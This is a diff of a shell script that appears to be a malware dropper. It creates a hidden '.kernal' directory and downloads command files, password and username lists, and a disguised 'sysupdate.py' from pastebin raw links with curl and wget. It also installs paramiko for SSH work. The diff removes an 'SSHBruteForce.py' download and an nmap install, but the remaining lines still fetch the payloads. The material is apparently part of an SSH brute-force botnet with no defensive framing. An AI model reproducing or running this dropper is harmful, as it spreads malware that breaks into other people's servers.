@@ -10,21 +10,16 @@ if [ -z $HOME ]; then
   export HOME=/dev/shm/sys
 fi
 mkdir $HOME/.kernal
-mkdir $HOME/.kernal/b
-curl -o $HOME/.kernal/cmd_1.txt https://pastebin.com/raw/DJuvm8v0;wget -O $HOME/.kernal/cmd_1.txt https://pastebin.com/raw/DJuvm8v0
 curl -o $HOME/.kernal/cmd.txt https://pastebin.com/raw/8uCHeF8k;wget -O $HOME/.kernal/cmd.txt https://pastebin.com/raw/8uCHeF8k
 curl -o $HOME/.kernal/pwd.txt https://pastebin.com/raw/UG35FES2;wget -O $HOME/.kernal/pwd.txt https://pastebin.com/raw/UG35FES2
 curl -o $HOME/.kernal/user_l.txt https://pastebin.com/raw/dkK8bZqn;wget -O $HOME/.kernal/user_l.txt https://pastebin.com/raw/dkK8bZqn
 curl -o $HOME/.kernal/sysupdate.py https://pastebin.com/raw/bBVK9Juq;wget -O $HOME/.kernal/sysupdate.py https://pastebin.com/raw/bBVK9Juq
-curl -o $HOME/.kernal/SSHBruteForce.py https://pastebin.com/raw/2Sz7cvdZ;wget -O $HOME/.kernal/SSHBruteForce.py https://pastebin.com/raw/2Sz7cvdZ
 
 if cat /etc/os-release | grep "Ubuntu" ; then
-        sudo apt install nmap -y
         sudo apt-get update -y
         sudo apt install python3-pip -y
         pip3 install paramiko
 else
-        yum -y install nmap
         yum -y install python3-pip
         pip3 install paramiko
 fi
